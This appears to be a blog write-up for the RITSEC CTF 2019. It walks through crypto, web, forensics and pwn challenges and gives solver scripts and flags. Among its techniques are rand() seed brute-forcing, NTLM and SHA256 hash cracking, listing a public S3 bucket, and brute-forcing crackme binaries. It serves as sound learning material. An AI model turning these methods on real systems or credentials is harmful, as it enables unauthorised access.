      <pubDate>Tue, 19 Nov 2019 17:31:59 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/</guid>
      <description>&lt;p&gt;A bit late for writeups, but still here are the solutions to the challenges I solved during the CTF. The CTF was from 15 Nov. 2019, 22:30 IST — Mon, 18 Nov. 2019, 10:30 IST. It was a decent CTF with quality challenges, from both beginner to advanced level.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: The scripts to solve and the flags are present in &lt;a href=&#34;https://github.com/wr47h/CTF-Writeups/tree/master/2019/RITSEC%20CTF%202019&#34;&gt;this repo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll do the writeups category-wise -&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;pre-legend — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;9EEADi^⁸:E9F3]4@&amp;amp;gt;⁴=2J32==^D@&amp;amp;gt;6E9:?8\FD67F=\C:ED64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This is the provided cipher text. Since all of these are ASCII characters, we try a ROT of till say, 50.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/e3386cba7303cdcb24b01d552b16aad4.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;On i=47, we get — https\x98\x8d\x8dgithub\x8ccom\x8dclayball\x8dsomething\x8buseful\x8britsec&lt;/p&gt;
&lt;p&gt;There is a problem with the special characters, but we understand that is a GitHub repo, with the URL (after some testing) — &lt;a href=&#34;https://github.com/clayball/something-useful-ritsec&#34;&gt;https://github.com/clayball/something-useful-ritsec&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Although there is nothing flag related in the repo, but the discord group of the CTF said that the link itself is the flag.&lt;/p&gt;
&lt;p&gt;Flag —&lt;strong&gt;RITSEC{https://github.com/clayball/something-useful-ritsec}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Shiny — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given the following text, and an image
&lt;code&gt;.‡8]5);483‡5;&lt;/code&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://cdn-images-1.medium.com/max/800/0*szkUp3DoP0hYUlyx&#34; data-caption=&#34;gold-bug.jfif&#34;&gt;
&lt;img src=&#34;https://cdn-images-1.medium.com/max/800/0*szkUp3DoP0hYUlyx&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    gold-bug.jfif
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This did not hit me directly, so I had to do a bit of Googling. I found that this is a reference to a short story by Edgar Allan Poe, called The Gold Bug which involves a substitution cipher. I found an &lt;a href=&#34;https://www.dcode.fr/gold-bug-poe&#34;&gt;online tool&lt;/a&gt; for the same.&lt;/p&gt;
&lt;p&gt;This gives us the flag —&lt;strong&gt;RITSEC{POEWASTHEGOAT}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;random — 290 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;After connecting to &lt;em&gt;nc ctfchallenges.ritsec.club 8001&lt;/em&gt; we find that we are presented with a series of numbers and we have to guess the next. The challenge title tells us that we have something to do with the &lt;strong&gt;random&lt;/strong&gt; function in the &lt;strong&gt;C&lt;/strong&gt; language, because of the hint,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Are you starting to &amp;lsquo;C&amp;rsquo; a pattern?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We make a guess that whenever we request that host and port, the random function is initialized with a certain seed and we are given the first five random numbers generated from that seed. So, I wrote a simple C code to bruteforce all unix timestamps from 15th Nov 2019, 00:00 UTC to 17th Nov. 2019 00:00 UTC, and check for the seed. The code is shown below —&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1573776000&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;// 15th Nov 2019, 00:00 UTC
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1573948800&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;// // 17th Nov 2019, 00:00 UTC
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;start; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;end; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        srand(i);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rand();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(a&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1068399227&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;161933545&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; c&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;741438783&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; d&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1951874661&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; e&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1076387813&lt;/span&gt;) {
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Seed: %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, i);
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Next: %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, f);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We provide the next number, and get the flag — &lt;strong&gt;RITSEC{404_RANDOMNESS_NOT_FOUND}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Crack me If You Can — 391 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this challenge, after connecting to &lt;em&gt;nc ctfchallenges.ritsec.club 8080&lt;/em&gt;, we find that we are presented with queries of hashes, and we have to break them in order to get the flag. They were NTLM and sha256 hashes. So, we used a combination of &lt;a href=&#34;http://crackstation.net&#34;&gt;crackstation.net&lt;/a&gt; and John the Ripper to crack both of them.&lt;/p&gt;
&lt;p&gt;We found the flag — &lt;strong&gt;RS{H@$HM31FY0UCAN}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Onion Layer Encoding — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The challenge says that the text is encoded using either Base16 or Baser32 or Base64 in a sequence. So we write a simple python script to solve it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onionlayerencoding.txt&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RITSEC&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; str(flag):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b16decode(flag)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b32decode(flag)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
            flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(flag)
            
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is — &lt;strong&gt;RITSEC{0n1On_L4y3R}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;AlPhAbEtIcAl Challenge - 100pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I couldn&amp;rsquo;t solve this during the CTF, but saw other writeups and found that it was actually pretty interesting. The cipher text that is provided is —&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;59:87:57:51:85:80{:40:50:56:08:82:58:81:08:18:85:57:87:48:85:88:40:50:56:59:15:56:11:18:85:59:51:}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We see that the &amp;lsquo;{&amp;rsquo; and &amp;lsquo;}&amp;rsquo; are in place. So, this must represent the flag. The other numbers are assigned some alphabet starting from &amp;lsquo;A&amp;rsquo;. After this we see that we have the following — ABCDEF{GHIJKLMJNECBOEPGHIAQIRNEAD}.&lt;/p&gt;
&lt;p&gt;On this we use an online substitution solver like quipquip.com and also the fact that ABCDEF corresponds to RITSEC, we get the flag as — &lt;strong&gt;RITSEC{YOUALPHABETIZEDYOURNUMBERS}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;misdirection — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a URL — &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/&#34;&gt;http://ctfchallenges.ritsec.club:5000/&lt;/a&gt; However, on clicking it we see that we are directed to another webpage &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/n&#34;&gt;http://ctfchallenges.ritsec.club:5000/n&lt;/a&gt; and the information that the webpage isn&amp;rsquo;t redirecting properly. So, I decided to see what is happening, for that I did a simple &lt;em&gt;wget&lt;/em&gt; to the url.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/3.png&#34; data-caption=&#34;Running wget&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Running wget
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We see that the page redirects to different pages and keeps doing that. We note that the last character is basically in the flag format when put together. We do that and get the flag — &lt;strong&gt;RS{4!way5_Ke3p-m0v1ng}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Buckets of fun — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given the following URL — &lt;a href=&#34;http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/&#34;&gt;http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Taking a hint from the name of the challenge, we try the following URL in the browser —&lt;a href=&#34;http://bucketsoffun-ctf.s3.amazonaws.com&#34;&gt;http://bucketsoffun-ctf.s3.amazonaws.com&lt;/a&gt;&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/4.png&#34; data-caption=&#34;The webpage&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/4.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The webpage
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We see a file &lt;strong&gt;youfoundme-asd897kjm.txt&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Heading to &lt;a href=&#34;http://bucketsoffun-ctf.s3.amazonaws.com/youfoundme-asd897kjm.txt&#34;&gt;http://bucketsoffun-ctf.s3.amazonaws.com/youfoundme-asd897kjm.txt&lt;/a&gt; we find the flag — &lt;strong&gt;RITSEC{LIST_HIDDEN_FILES}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;forensics&#34;&gt;Forensics&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Take it to the Cleaners — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given an image&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/5.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/5.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Performing basic recon, we check the metadata for the image using exiftool.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/6.png&#34; data-caption=&#34;exiftool output&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/6.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    exiftool output
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;In the user comment, we see a string which is probably base64 encoded.&lt;/p&gt;
&lt;p&gt;Decoding it gives, &lt;strong&gt;EVGFRP{SBERAFVPF_SNVYF_JBAG_URYC_LBH_URER}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Looks rotated by an offset. We use &lt;a href=&#34;http://theblob.org/rot.cgi&#34;&gt;http://theblob.org/rot.cgi&lt;/a&gt; to get rotations by different offsets. This is ROT13 and the flag is — &lt;strong&gt;RITSEC{FORENSICS_FAILS_WONT_HELP_YOU_HERE}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;Long Gone — 100 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are provided a chromebin. Extract it as it is a tar archive.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tar xzvf ./chromebin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We see there are a lot of folders, on inspecting the history we find it is an SQLite 3.X database. Loading it into DBBrowser, and inspecting the tables, shows an odd URL — us-central-1.ritsec.club/l/relaxfizzblur&lt;/p&gt;
&lt;p&gt;Opening the url gives the flag — &lt;strong&gt;RITSEC{SP00KY_BR0WS3R_H1ST0RY}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;999 Bottles — 110 pts&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given 999 ELF files, each having a password as a single character. Basically, 999 crackmes with a one character password. If we check the disassembly of main function of any one —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/7.png&#34; data-caption=&#34;The disassembly for main&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/7.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The disassembly for main
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;At 0x8048728 we see a comparison, where register edx (dl) stores our input character and eax (al) stores the value at address 0x804a039.&lt;/p&gt;
&lt;p&gt;Also, in the disassembly, we have some character mappings to addresses —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/8.png&#34; data-caption=&#34;Character mappings&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/images/8.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Character mappings
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;So, one way to solve this challenge is to get the address to be compared and check the character at this address and automate it somehow.&lt;/p&gt;
&lt;p&gt;During the CTF, however, I wrote a bruteforce script to try all characters for every ELF file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string

FOLDER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./elfs/&amp;#39;&lt;/span&gt;
filenames &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;punctuation

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):
    filenames&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str(i)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;zfill(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.c.out&amp;#39;&lt;/span&gt;)flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; filenames:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; inp &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; s:
        p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(FOLDER&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;file)
        p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
        p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(inp)
        a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;OK!&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a:
            flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; inp
            p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FLAG: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag)
            f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FLAG: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag)
            f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
            
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FLAG: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, we have the following string in the output generated -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;lr^wN${HnW&amp;lt;DtVjk.RITSEC{AuT057v}^W!xT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Note the string in the flag format, that is the flag — &lt;strong&gt;RITSEC{AuT057v}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A better way to solve it actually using the method described above. The following script can help do that -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; r2pipe  
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; binascii  
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;elfs/{0:03}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(i))  
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r2pipe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;elfs/{0:03}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(i) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.c.out&amp;#39;&lt;/span&gt;)

    disass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cmd(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aaa; s main; pdd&amp;#39;&lt;/span&gt;)  
    field &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; disass&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax = *(obj.&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]  
